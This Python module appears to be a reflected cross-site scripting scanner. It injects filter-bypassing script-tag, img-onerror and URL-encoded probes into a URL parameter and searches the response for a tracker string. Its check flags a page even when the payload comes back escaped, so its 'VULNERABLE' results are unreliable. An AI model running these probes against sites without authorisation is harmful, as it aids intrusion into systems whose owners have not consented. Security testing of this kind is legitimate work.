#xss_engine
import urllib.request
import urllib.parse
import urllib.error
import random
import string
import queue
import threading

result_queue = queue.Queue()
is_running = False

def generate_payloads():
    tracker = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    payloads = []
    base_script = f"<script>console.log('xss_{tracker}')</script>"
    payloads.append(("Standard", base_script))
    payloads.append(("Mixed Case", f"<sCrIpT>console.log('xss_{tracker}')</ScRiPt>"))
    
    # 3. Image Tag Polyglot (Bypasses filters blocking script tags)
    img_payload = f"<img src=x onerror=console.log('xss_{tracker}')>"
    payloads.append(("Image Polyglot", img_payload))
    
    # 4. Single URL Encoded
    payloads.append(("URL Encoded", urllib.parse.quote(base_script)))
    
    # 5. Double URL Encoded (Bypasses filters that decode only once before checking)
    payloads.append(("Double URL Encoded", urllib.parse.quote(urllib.parse.quote(base_script))))
    
    return payloads, tracker

def run_xss_scan(base_url, param_name):
    global is_running
    is_running = True
    
    result_queue.put(("STATUS", f"Generating payloads for parameter: {param_name}"))
    payloads, tracker = generate_payloads()
    
    result_queue.put(("STATUS", f"Unique Tracker ID for this scan: {tracker}"))
    
    for name, payload in payloads:
        if not is_running:
            break
            
        result_queue.put(("SCANNING", f"Testing {name} payload..."))
        
        # Build the injection URL safely
        query_string = urllib.parse.urlencode({param_name: payload})
        
        # Check if the base URL already has parameters
        if '?' in base_url:
            target_url = f"{base_url}&{query_string}"
        else:
            target_url = f"{base_url}?{query_string}"
            
        try:
            req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=15) as response:
                html_bytes = response.read()
                status_code = response.getcode()
                
        # Catch HTTP errors (403, 500, etc.) but still read the HTML!
        except urllib.error.HTTPError as e:
            html_bytes = e.read()
            status_code = e.code
            
        # Catch total network failures (timeouts, no internet)
        except Exception as e:
            result_queue.put(("ERROR", f"[{name}] Network Failure - {str(e)}"))
            continue  # Skip to the next payload
            
        html_text = html_bytes.decode('utf-8', errors='ignore')
        
        # THE MAGIC CHECK: Did our tracker survive in the raw HTML?
        if tracker in html_text:
            result_queue.put(("VULNERABLE", f"[{name}] Reflected! (HTTP {status_code})"))
        else:
            result_queue.put(("FAILED", f"[{name}] Blocked/Sanitized (HTTP {status_code})"))

    if is_running:
        result_queue.put(("DONE", "XSS Scan Complete."))
    else:
        result_queue.put(("DONE", "Scan aborted by user."))
        
    is_running = False

def stop_xss_scan():
    global is_running
    is_running = False